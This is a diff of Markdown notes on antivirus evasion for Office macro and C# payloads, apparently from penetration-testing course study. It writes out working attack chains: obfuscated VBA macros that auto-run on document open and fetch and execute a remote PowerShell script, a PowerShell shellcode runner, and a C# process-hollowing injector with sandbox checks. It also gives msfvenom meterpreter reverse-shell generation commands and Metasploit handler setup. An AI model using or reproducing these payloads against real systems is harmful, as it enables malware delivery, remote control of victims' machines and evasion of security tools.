@@ -6,34 +6,135 @@ nav_order: 1
 ---
 
 # Effective Methods
-[Ineffective Methods](#ineffective-methods)
-[Original Shellcode](#original-shellcode)
+[Ineffective Methods](#ineffective-methods)\
+[Original Shellcode](#original-shellcode)\
 [Original VBA Code](#original-vba-code)
 
-## Powershell Inside VBA ##
 
-1. Must use 64 bit for the Powershell shellcode runner:
-`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
+## Full Obfuscation VBA ##
 
-2. Avoid using Shell function:
+1. Refer to powershellwinapi if lost. Generate shellcode using:\
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`
+
+2. Put into below (64 bit by default) as a run.txt and host it in Apache:
+
+```powershell
+$Shell32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Shell32{
+[DllImport("Kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("Kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("Kernel32.dll", SetLastError = true)]
+public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+}
+"@
+
+Add-Type $Shell32
+
+[Byte[]] $buf = SHELLCODE HERE
+$size = $buf.length
+$sizeUIntPtr = New-Object System.UIntPtr $size
+[IntPtr]$addr = [Shell32]::VirtualAlloc(0,$sizeUIntPtr,0x3000,0x40);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+$thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
+[Shell32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
-Sub MyMacro
-  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
-  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+
+3\. Create a powershell script as below (change run.txt to whatever name you saved powershell above):
+
+```
+$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
+
+[string]$output = ""
+
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+$output | clip
+```
+
+4\. In the actual VBA (change the name based on the name of the doc(eg below is test.doc), and apples to the shellcode line, both using step 3)):
+
+```
+Function MyMacro()
+
+    If ActiveDocument.Name <> Nuts("133118132133063117128116") Then
+        Exit Function
+    End If
+
+    Dim Apples As String
+    Dim Water As String
+    
+    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
+    Water = Nuts(Apples)
+    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+End Function
+
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Sub Document_Open()
+MyMacro
 End Sub
 
 Sub AutoOpen()
-    Mymacro
+MyMacro
 End Sub
 ```
 
+5\. Prepare for shell:
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost IP
+set lport PORT
+exploit
+```
 
-## Encrypting C# Shellcode with Caesar cipher ##
+## Full Process Hollowing + Combined Tactics
 
-1. Generate a C# shellcode:
+1. Generate msfvenom with:\
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
 
-2. Create a new Helper program with our generated shellcode:
+2. Create a new Helper C# program with our generated shellcode:
 
 ```
 namespace Helper
@@ -62,7 +163,239 @@ namespace Helper
 }
 ```
 
-3. Refer to the [original C# Shellcode](#original-shellcode). Add the following code under the shellcode:
+3\. Visual Studio -> create new "Console App (.NET Framework)". Namespace is the name of project. Full code (change the shellcode with step 2):
+
+```
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+namespace HollowEvade
+{
+    class Program
+    {
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
+    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
+    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
+        uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
+    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        static void Main(string[] args)
+        {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+            uint tmp = 0;
+            IntPtr hProcess = pi.hProcess;
+            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+            byte[] addrBuf = new byte[IntPtr.Size];
+            IntPtr nRead = IntPtr.Zero;
+            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+            byte[] data = new byte[0x200];
+            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+
+            uint opthdr = e_lfanew_offset + 0x28;
+
+            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+            byte[] buf = new byte[799] { };
+
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+            }
+
+            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+            ResumeThread(pi.hThread);
+        }
+    }
+}
+```
+
+4\. Prepare for incoming shell:
+
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost IP
+set lport PORT
+exploit
+```
+
+## Powershell Inside VBA ##
+
+1. Must use 64 bit for the Powershell shellcode runner for this:\
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`
+
+2. Avoid using Shell function:
+
+```
+Sub MyMacro
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
+```
+
+## Reverse String VBA ##
+
+1. Must use 64 bit for the Powershell shellcode runner for this:\
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`
+
+2. Reverse the string using `StrReverse()` and use other name for function name:
+
+```
+Function bears(cows)
+    bears = StrReverse(cows)
+End Function
+
+Sub Mymacro()
+Dim strArg As String
+strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
+
+GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
+End Sub
+```
+
+
+## Encrypting C# Shellcode with Caesar cipher ##
+
+1. Generate a C# shellcode:\
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
+
+2. Create a new Helper C# program with our generated shellcode:
+
+```
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[752] {}
+                
+            byte[] encoded = new byte[buf.Length];
+            for(int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+            }
+
+            StringBuilder hex = new StringBuilder(encoded.Length * 2);
+            foreach(byte b in encoded)
+            {
+                hex.AppendFormat("0x{0:x2}, ", b);
+            }
+
+            Console.WriteLine("The payload is: " + hex.ToString());
+        }
+    }
+}
+```
+
+3\. Refer to the [original C# Shellcode](#original-shellcode). Add the following code under the shellcode:
 
 ```
 for(int i = 0; i < buf.Length; i++)
@@ -73,7 +406,7 @@ for(int i = 0; i < buf.Length; i++)
 
 ## Detect Simulation with Sleep Timers ##
 
-1. Generate a C# shellcode:
+1. Generate a C# shellcode:\
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
 
 2. Refer to the [original C# Shellcode](#original-shellcode), and can also combine it with the Caesar cipher.
@@ -144,36 +477,37 @@ Note: VBA Stomping does not work for files saved in the Excel 97-2003 Workbook (
 
 
 # Ineffective Methods
-[Effective Methods](#effective-methods)
-[Original Shellcode](#original-shellcode)
+[Effective Methods](#effective-methods)\
+[Original Shellcode](#original-shellcode)\
 [Original VBA Code](#original-vba-code)
 
 ## Metasploit Encoders ##
 
-1. Listing all the available encoders:
+1. Listing all the available encoders:\
 `msfvenom --list encoders`
 
-2. 32-bit encoder(shikata_ga_nai):
+2. 32-bit encoder(shikata_ga_nai):\
 `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /tmp/met.exe`
 
-3. 64-bit encoder(zutto_dekiru):
-`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o /tmp/met64_zutto.exe`
+3. 64-bit encoder(zutto_dekiru):\
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o /tmp/met64_zutto.exe`\
+Note: x64/xor_dynamic is a useful one!
 
-4. Specifying a different template (for eg notepad.exe) for the generated executable on top of zutto encoder:
+4. Specifying a different template (for eg notepad.exe) for the generated executable on top of zutto encoder:\
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /tmp/met64_notepad.exe`
 
 ## Metasploit Encryptors ##
 
-1. Listing all the available encryptors:
+1. Listing all the available encryptors:\
 `msfvenom --list encrypt`
 
-2. Encrypt using aes256:
+2. Encrypt using aes256:\
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /tmp/met64_aes.exe`
 
 
 ## Caesar Cipher on VBA ##
 
-1. Generate a VBA shellcode:
+1. Generate a VBA shellcode:\
 `msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
 
 2. Create a new Helper program with our generated shellcode:
@@ -212,7 +546,7 @@ namespace Helper
 }
 ```
 
-3. Refer to the [original VBA Code](#original-vba-code). Add the following code under the shellcode:
+3\. Refer to the [original VBA Code](#original-vba-code). Add the following code under the shellcode:
 
 ```
 For i = 0 To UBound(buf)
@@ -222,7 +556,7 @@ Next i
 
 ## Sleep Timer on VBA ##
 
-1. Generate a VBA shellcode:
+1. Generate a VBA shellcode:\
 `msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
 
 2. Refer to the [original VBA Code](#original-vba-code), and can also combine it with the Caesar cipher.
@@ -247,8 +581,8 @@ End If
 
 
 # Original Shellcode
-[Effective Methods](#effective-methods)
-[Ineffective Methods](#ineffective-methods)
+[Effective Methods](#effective-methods)\
+[Ineffective Methods](#ineffective-methods)\
 [Original VBA Code](#original-vba-code)
 
 ```
@@ -296,8 +630,8 @@ namespace ConsoleApp1
 }
 ```
 # Original VBA Code
-[Effective Methods](#effective-methods)
-[Ineffective Methods](#ineffective-methods)
+[Effective Methods](#effective-methods)\
+[Ineffective Methods](#ineffective-methods)\
 [Original Shellcode](#original-shellcode)
 
 ```
@@ -333,4 +667,23 @@ Sub AutoOpen()
 End Sub
 
 End Function
+```
+
+# References to Decode the Encoded VBA Name
+
+```
+# Encoded numbers as input
+[string]$encoded = "136122127126120126133132075104122127068067112097131128116118132132"
+
+# Initialize decoded output
+[string]$decoded = ""
+
+# Split into chunks of 3 digits
+$encoded -split "(?<=\G...)" | ForEach-Object {
+    # Convert each chunk back to an integer and subtract 17
+    $decoded += [char]([int]$_ - 17)
+}
+
+# Output the decoded string
+$decoded
 ```
